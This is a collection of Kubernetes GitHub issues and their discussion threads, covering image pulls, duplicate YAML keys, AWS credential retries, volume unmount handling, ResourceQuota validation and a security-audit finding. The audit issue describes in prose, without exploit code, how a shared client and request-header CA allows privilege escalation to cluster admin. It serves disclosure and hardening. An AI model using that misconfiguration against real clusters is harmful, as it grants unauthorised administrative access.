"body": "I did as @paol said, i restarted the kubelet service int the node:\r\n`systemctl restart kubelet`\r\n\r\nI downloaded the image manually.\r\n\r\nThen I deleted the stuck pod and it worked!\r\n\r\n\r\n "}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n/lifecycle stale"}, {"author": "krystiannowak", "body": "/remove-lifecycle stale"}, {"author": "Frederik-Baetens", "body": "Just had this issue on GKE 1.20, about 50 pods took about an hour to get pulled from various registries, including docker and azure before everything worked."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 125885, "issue_url": "https://github.com/kubernetes/kubernetes/issues/125885", "issue_title": "Multi-container pod creation from YAML with multiple \"containers\" statements", "issue_author": "NikolaStoychev", "issue_body": "### What happened?\n\nTrying to create a POD object, from YAML file, with the following structure, does not throw error.\r\n```\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  creationTimestamp: null\r\n  labels:\r\n    run: busybox\r\n  name: busybox\r\nspec:\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox\r\n    resources: {}\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox2\r\n    resources: {}\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox3\r\n    resources: {}\r\n  dnsPolicy: ClusterFirst\r\n  restartPolicy: Never\r\nstatus: {}\r\n```\r\n\r\nThe result of the creation of this object is:\r\n```\r\ncontrolplane $ k create -f po.yaml\r\npod/busybox created\r\ncontrolplane $ k get po\r\nNAME      READY   STATUS      RESTARTS   AGE\r\nbusybox   0/1     Completed   0          8s\r\n```\r\nThe pod will never go to \"Ready\" status. The event in the pod description are:\r\n```\r\nEvents:\r\n  Type    Reason     Age   From               Message\r\n  ----    ------     ----  ----               -------\r\n  Normal  Scheduled  19s   default-scheduler  Successfully assigned default/busybox to node01\r\n  Normal  Pulling    18s   kubelet            Pulling image \"busybox\"\r\n  Normal  Pulled     18s   kubelet            Successfully pulled image \"busybox\" in 165ms (165ms including waiting). Image size: 2160406 bytes.\r\n  Normal  Created    18s   kubelet            Created container busybox3\r\n  Normal  Started    18s   kubelet            Started container busybox3\r\n```\r\n \n\n### What did you expect to happen?\n\nMy understanding is that the \"spec\" section of this YAML in not correct. I expect no object to be created, when to create such from this YAML file. The behavior as of now is confusing and inconsistent. An error should be throw, informing the user that he should fix the YAML file structure.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1. Create a YAML file with the provided example in the \"What happened?\" section, name it `po.yaml`\r\n2. Create the object using imperative command `kubectl create -f po.yaml`\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\nClient Version: v1.30.0\r\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\r\nServer Version: v1.30.0\r\n```\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\n\r\n`https://killercoda.com/killer-shell-ckad/scenario/playground`\r\n\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\nNAME=\"Ubuntu\"\r\nVERSION=\"20.04.5 LTS (Focal Fossa)\"\r\nID=ubuntu\r\nID_LIKE=debian\r\nPRETTY_NAME=\"Ubuntu 20.04.5 LTS\"\r\nVERSION_ID=\"20.04\"\r\nHOME_URL=\"https://www.ubuntu.com/\"\r\nSUPPORT_URL=\"https://help.ubuntu.com/\"\r\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\r\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\r\nVERSION_CODENAME=focal\r\nUBUNTU_CODENAME=focal\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/api-machinery", "sig/cli", "lifecycle/stale", "needs-triage"], "comments": [{"author": "niranjandarshann", "body": "@NikolaStoychev Yes I also seen the same issue  but i would like to suggest you one thing try to remove multiple times   used container keys in one. Then hope it may work."}, {"author": "niranjandarshann", "body": "For Me this Worked fine \r\n```\r\n\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  labels:\r\n    run: busybox\r\n  name: busybox\r\nspec:\r\n  containers:\r\n  - name: busybox\r\n    image: busybox\r\n    command: [\"/bin/sh\", \"-c\", \"echo Hello World! && sleep 3600\"]\r\n  - name: busybox2\r\n    image: busybox\r\n    command: [\"/bin/sh\", \"-c\", \"echo Hello World! && sleep 3600\"]\r\n  - name: busybox3\r\n    image: busybox\r\n    command: [\"/bin/sh\", \"-c\", \"echo Hello World! && sleep 3600\"]\r\n  dnsPolicy: ClusterFirst\r\n  restartPolicy: Never\r\n\r\n```"}, {"author": "niranjandarshann", "body": "/sig node"}, {"author": "ffromani", "body": "/triage accepted\r\n"}, {"author": "chengjoey", "body": "This can also be created, multpie \"spec\"\r\n```\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  creationTimestamp: null\r\n  labels:\r\n    run: busybox\r\n  name: busybox\r\nspec:\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox2\r\n    resources: {}\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox3\r\n    resources: {}\r\n  dnsPolicy: ClusterFirst\r\n  restartPolicy: Never\r\nspec:\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox2\r\n    resources: {}\r\n  containers:\r\n  - args:\r\n    - /bin/sh\r\n    - -c\r\n    - echo Hello World!\r\n    image: busybox\r\n    name: busybox3\r\n    resources: {}\r\n  dnsPolicy: ClusterFirst\r\n  restartPolicy: Never\r\n\r\n```\r\nget pod:\r\n```\r\nNAME                         READY   STATUS      RESTARTS   AGE\r\nbusybox                      0/1     Completed   0          5s\r\n```"}, {"author": "aojea", "body": "If we execute the manifest with enough verbosity we can see the json that is sent to the apiserver\r\n```\r\nI0704 14:57:45.574876  984721 request.go:1188] Request Body: {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"creation\r\nTimestamp\\\":null,\\\"labels\\\":{\\\"run\\\":\\\"busybox\\\"},\\\"name\\\":\\\"busybox\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"args\\\":[\\\"/bin/sh\\\",\\\"-c\\\",\\\"echo Hello World!\\\"],\\\"image\\\":\\\"busybox\\\",\\\"name\\\":\\\"busybox3\\\",\\\"resources\\\":{}}],\\\"dnsPolicy\\\":\\\"ClusterFirst\\\",\\\"restartPolicy\\\":\\\"Never\\\"},\\\"status\\\":{}}\\n\"},\"creationTimestamp\":null,\"labels\":{\"run\":\"busybox\"},\"name\":\"busybox\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"args\":[\"/bin/sh\",\"-c\",\"echo Hello World!\"],\"image\":\"busybox\",\"name\":\"busybox3\",\"resources\":{}}],\"dnsPolicy\":\"ClusterFirst\",\"restartPolicy\":\"Never\"},\"status\":{}}\r\nI0704 14:57:45.574908  984721 round_trippers.go:466] curl -v -XPOST  -H \"Accept: application/json\" -H \"Content-Type: application/json\" -H \"User-Agent: kubectl/v1.27.15 (linux/amd64) kubernetes/a62bdc4\" 'https://127.0.0.1:33491/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply&fieldValidation=Strict'\r\nI0704 14:57:45.581371  984721 round_trippers.go:553] POST https://127.0.0.1:33491/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply&fieldValidation=Strict 201 Created in 6 milliseconds\r\n```\r\n\r\nThat does not contain the duplicate entries, so most probably something happens on the conversion that \"swallows\" the error and deduplicate the entries\r\n\r\n/remove sig-node\r\n/sig api-machinery\r\n/sig cli\r\n\r\nI think it should be one of these SIGs , but does not look like node"}, {"author": "HirazawaUi", "body": "/remove-sig node"}, {"author": "chengjoey", "body": "https://github.com/kubernetes/kubernetes/blob/95debfb5b6dcfa2467f2700d81df6767a2c91bac/staging/src/k8s.io/cli-runtime/pkg/resource/visitor.go#L589-L599\r\n=>\r\nhttps://github.com/kubernetes/kubernetes/blob/95debfb5b6dcfa2467f2700d81df6767a2c91bac/staging/src/k8s.io/apimachinery/pkg/util/yaml/decoder.go#L122-L135\r\n\r\nThere is no strict validation using `yaml.UnmarshalStrict`.\r\n\r\ndemo:\r\n```\r\npackage main\r\n\r\nimport (\r\n\t\"log\"\r\n\t\"sigs.k8s.io/yaml\"\r\n)\r\ntype dat struct {\r\n\tA string `json:\"a\"`\r\n}\r\n\r\nvar file = `\r\na: b\r\na: c\r\n`\r\n\r\nfunc main() {\r\n\tvar d dat\r\n\tvar dStrict dat\r\n\tif err := yaml.Unmarshal([]byte(file), &d); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tlog.Println(\"unmarshal without strict succeed, value:\", d.A)\r\n\tif err := yaml.UnmarshalStrict([]byte(file), &dStrict); err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tlog.Println(dStrict.A)\r\n}\r\n```\r\n\r\noutput:\r\n```\r\n2024/07/05 11:33:43 unmarshal without strict succeed, value: c\r\npanic: error converting YAML to JSON: yaml: unmarshal errors:\r\n  line 3: key \"a\" already set in map\r\n```"}, {"author": "chengjoey", "body": "kubectl apply or create should add `strict` option when converting yaml to json"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "NikolaStoychev", "body": "/close"}, {"author": "k8s-ci-robot", "body": "@NikolaStoychev: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/125885#issuecomment-3382564717):\n\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 119267, "issue_url": "https://github.com/kubernetes/kubernetes/issues/119267", "issue_title": "NCC-E003660-F9W: Common Certificate Authority Possible for Client CA and Request", "issue_author": "reylejano", "issue_body": "### NCC-E003660-F9W: Common Certificate Authority Possible for Client CA and Request\r\nHeader CA\r\nThis issue was reported in the [Kubernetes 1.24 Security Audit Report](https://github.com/kubernetes/sig-security/blob/main/sig-security-external-audit/security-audit-2021-2022/findings/Kubernetes%20v1.24%20Final%20Report.pdf)\r\n\r\n**Impact**\r\nA misconfiguration of the API server could lead to a situation where privilege escalation for\r\nany authenticated user to cluster admin is possible.\r\n\r\n**Description**\r\nThe Kubernetes API server allows a certificate authority (CA) to be specified (using the `--\r\nclient-ca-file flag`) which will be used to verify client certificates under the familiar X.\r\n509 client certificate authentication scheme6. Another CA can be specified (using `--\r\nrequestheader-client-ca-file`) that will be used to verify requests authenticated using\r\nthe request header scheme (described in the documentation as Authenticating Proxy). If\r\nthese two CAs are the same, and the `--requestheader-allowed-names` flag is not used to\r\nspecify particular certificate common names that are permitted for request header\r\nauthentication, it is possible for any holder of a client certificate from the shared CA to\r\ntrivially authenticate to the API server as any user, by using their certificate to authenticate\r\na request using the request header scheme. While it is not intended that these CAs be the\r\nsame, and common Kubernetes deployment methods do not configure the deployment in\r\nthis way, it is possible that administrators could be unaware of this pitfall.\r\n\r\nThe Kubernetes documentation does include some advice against sharing CAs, but is not\r\nexplicit about the potentially serious security impact of this specific case.\r\n\r\nFor an example, please see the original finding on page 18 of the [Kubernetes 1.24 Security Audit Report](https://github.com/kubernetes/sig-security/blob/main/sig-security-external-audit/security-audit-2021-2022/findings/Kubernetes%20v1.24%20Final%20Report.pdf)\r\n\r\n**Recommendation**\r\nThe Kubernetes API server should reject any configuration where `--client-ca-file` and\r\n`--requestheader-client-ca-file` are set to the same value, unless `--requestheaderallowed-\r\nnames` has been set to specific value(s).\r\n\r\nIt may also be advisable to update the Kubernetes documentation to be more explicit about\r\nthe specific risks of sharing certificate authorities. For example, using the same CA for X.\r\n509 client certificates for etcd authentication would allow any authenticated user to\r\ndirectly access etcd (although this scenario is considered less likely than sharing of the\r\nclient CA and request header CA).\r\n\r\n**Component**\r\nkube-apiserver\r\n\r\n\r\n**Anything else we need to know?**\r\nSee umbrella issue [#118980](https://github.com/kubernetes/kubernetes/issues/118980) for current status of all issues created from these findings.\r\nThe vendor gave this issue an ID of NCC-E003660-F9W and it was finding 5 of the report under the kube-apiserver section.\r\nThe vendor considers this issue Medium Risk, High Impact, Low Exploitability\r\nTo view the original finding, begin on page 18 of the [Kubernetes 1.24 Security Audit Report](https://github.com/kubernetes/sig-security/blob/main/sig-security-external-audit/security-audit-2021-2022/findings/Kubernetes%20v1.24%20Final%20Report.pdf)\r\n\r\n**Test Environment**\r\nKubernetes 1.24.3\r\n", "issue_labels": ["priority/backlog", "sig/auth", "help wanted", "sig/security", "needs-triage"], "comments": [{"author": "reylejano", "body": "/sig security"}, {"author": "Impero97", "body": "Hi, I'm doing some researches for an eventual Kubernetes hardening in my university. By any chance, did you find the part of the code where the flags are set? I'd like to implement a code-level check to prevent this vulnerability.  thank you"}, {"author": "liggitt", "body": "/sig auth\r\n/sig api-machinery"}, {"author": "reylejano", "body": "@impy97, the flags are in kube-apiserver\r\nPlease see https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/"}, {"author": "liggitt", "body": "Discussed in [sig-auth meeting on 2024-01-03](https://docs.google.com/document/d/1woLGRoONE3EBVx-wTb4pvp4CI7tmLZ6lS26VTbosLKM/edit#heading=h.jwmy3no7one8)\r\n\r\nOverlapping client-ca and requestheader-client-ca-file without requestheader-allowed-names is a very problematic configuration. Preventing specifically that configuration by requiring \u2013requestheader-allowed-names when CA bundles overlap seems reasonable.\r\n\r\nNo one is currently assigned to this issue, but it seems relatively straightforward to add a validation check at server startup to do this.\r\n\r\n/triage accepted\r\n/priority backlog\r\n"}, {"author": "ballista01", "body": "@liggitt I'd like to contribute to this issue."}, {"author": "ballista01", "body": "/assign"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 126168, "issue_url": "https://github.com/kubernetes/kubernetes/issues/126168", "issue_title": "Intermittent error on new Nodes: \"Unable to locate credentials\"", "issue_author": "vincent-simpson", "issue_body": "### What happened?\n\nWe have pods with an entry point script which first downloads many files from s3 using the aws CLI. This is a very intermittent issue. Our theory is that it relates to large Nodes (72+ CPU capacity) and having many of these pods scheduled at the same time, causing some race condition.\r\n\r\nThe full error message is\r\n```\r\nUnable to locate credentials. You can configure credentials by running \"aws configure\"\r\n```\r\n\r\nWe implemented a retry in our scripts that will retry 20 times, but have noticed it succeeds after the second try.\n\n### What did you expect to happen?\n\nThe aws CLI command should be able to configure itself with the credentials file successfully.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nWe have not been able to reliably reproduce this issue every time.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\n$ kubectl version\r\n# paste output here\r\n```\r\n1.28\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\nAWS\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n5.10.219-208.866.amzn2.x86_64 \r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\ncontainerd://1.7.11\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "kind/support", "needs-sig", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "neolit123", "body": "> Unable to locate credentials. You can configure credentials by running \"aws configure\"\r\n\r\nthis is not a k8s error.\r\ntry contacting aws support or try talking with other users at the k8s support forums\r\nhttps://github.com/kubernetes/kubernetes/blob/master/SUPPORT.md\r\n\r\n/close\r\n/kind support\r\n"}, {"author": "k8s-ci-robot", "body": "@neolit123: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/126168#issuecomment-2233708751):\n\n>> Unable to locate credentials. You can configure credentials by running \"aws configure\"\r\n>\r\n>this is not a k8s error.\r\n>try contacting aws support or try talking with other users at the k8s support forums\r\n>https://github.com/kubernetes/kubernetes/blob/master/SUPPORT.md\r\n>\r\n>/close\r\n>/kind support\r\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ann-qin-lu", "body": "+1. ran into same issue. @vincent-simpson in case you found the root cause/solution? Thanks!"}, {"author": "vincent-simpson", "body": "> +1. ran into same issue. [@vincent-simpson](https://github.com/vincent-simpson) in case you found the root cause/solution? Thanks!\n\n@ann-qin-lu  We basically just added retry logic in our scripts to handle this. We found that the status code for this particular error is 253, so we also check for that\n```\nfor i in $(seq 1 $RETRIES); do\n        echo \"Downloading from S3 - $s3_file_path to $local_file_path\"\n        if aws s3 cp \"${s3_file_path}\" \"${local_file_path}\" --recursive --exclude \"*\" --include \"*.zip\"; then\n            return 0\n        else\n            local exit_code=$?\n            if [[ $exit_code -eq MISSING_CREDENTIALS_ERROR_CODE ]]; then\n                echo \"Encountered error code 253 (Unable to locate credentials). Retrying in ${RETRY_DELAY} seconds...\"\n                sleep $RETRY_DELAY\n            elif [[ $exit_code -eq 1 ]]; then\n                echo \"File does not exist in s3 at path ${s3_file_path}\"\n                return 1\n            else\n                echo \"Failed to copy ${s3_file_path} to ${local_file_path}\"\n                return $exit_code\n            fi\n        fi\n    done\n\n```"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133597, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133597", "issue_title": "Kubelet Volume Manager can erroneously mark volume as unmounted.", "issue_author": "eltrufas", "issue_body": "### What happened?\n\nWe observed an edge case where an API server transient issue can cause a volume to be marked as unmounted in the volume manager's ASW, and making the subsequent `NodeVolumeUnstage` calls to fail due to dangling publish mounts.\n\nThe sequence of events is:\n1. A map volume operation is kicked off.\n2. The API server has a transient issue, causing the map volume operation to fail with `Error: MapVolume.MarkVolumeAsMounted failed while expanding volume for volume $PVC`. This error happens after the `MapPodDevice` (and therefore the `NodePublishVolume`) call has already succeeded. This causes the volume mount to be marked as uncertain and the map to be requeued.\n3. When the operation retries,  the api server issue causes the MapPodDevice to fail with `blockMapper.publishVolumeForBlock failed to get NodePublishSecretRef`\n4. This error causes `markVolumeErrorState` to be called. The logic here[0] falls into a branch that marks the volume as unmounted in ASW, since the mount is marked uncertain.\n5. At this point the pod is deleted, so the map operation doesn't happen again. Since the volume is marked unmounted, the VM reconciler doesn't call unpublish for this pod and volume pair.\n\n[0] https://github.com/kubernetes/kubernetes/blob/56dd5ab10ff19aa9ebe438122a00472c4135de23/pkg/volume/util/operationexecutor/operation_generator.go#L819\n\n\n### What did you expect to happen?\n\nAll volumes are unpublished correctly after the pod is deleted.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nOnce `MapPodDevice` completes, trigger pod deletion and inject API failures. This should cause the pod to be deleted without unpublish being called.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.28.3\nServer Version: v1.30.8\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\nTrident CSI v25.06.1\n\n</details>\n", "issue_labels": ["kind/bug", "sig/storage", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "eltrufas", "body": "/sig storage"}, {"author": "eltrufas", "body": "Seems like a similar situation to #120268. We might want to treat certain type of API errors as transient."}, {"author": "gnufied", "body": "/assign\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 130743, "issue_url": "https://github.com/kubernetes/kubernetes/issues/130743", "issue_title": "Create ResourceQuota request resource more than limit resource, is it normal?", "issue_author": "lengrongfu", "issue_body": "### What happened?\n\nI can create this ResourceQuota, it cpu request more than limits.\n```\napiVersion: v1\nkind: ResourceQuota\nmetadata:\n  creationTimestamp: \"2025-03-12T09:26:12Z\"\n  name: quota-test\n  namespace: test\n  resourceVersion: \"654584334\"\n  uid: b41e9dce-5228-48bf-98d0-ab3980ab56a2\nspec:\n  hard:\n    limits.cpu: \"1\"\n    requests.cpu: \"10\"\n```\n\n### What did you expect to happen?\n\nWe can in the webhook to check this value, prevent request value more than limit.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nkubectl create -f \n```\napiVersion: v1\nkind: ResourceQuota\nmetadata:\n  name: quota-test\nspec:\n  hard:\n    limits.cpu: \"1\"\n    requests.cpu: \"10\"\n```\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n```\n$ kubectl version\nClient Version: v1.30.3\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\nServer Version: v1.27.5\nWARNING: version difference between client (1.30) and server (1.27) exceeds the supported minor version skew of +/-1\n```\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/apps", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "lengrongfu", "body": "/sig apps\n/wg apps"}, {"author": "k8s-ci-robot", "body": "@lengrongfu: The label(s) `wg/apps` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/130743#issuecomment-2717279149):\n\n>/sig apps\n>/wg apps\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "lengrongfu", "body": "/assign\n\nIf this is the problem, I can fix it."}, {"author": "googs1025", "body": "> What did you expect to happen?\nWe can in the webhook to check this value, prevent request value more than limit.\n\nmaybe we should check it during validation? \ud83e\udd14 "}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "googs1025", "body": "/remove-lifecycle rotten"}]}
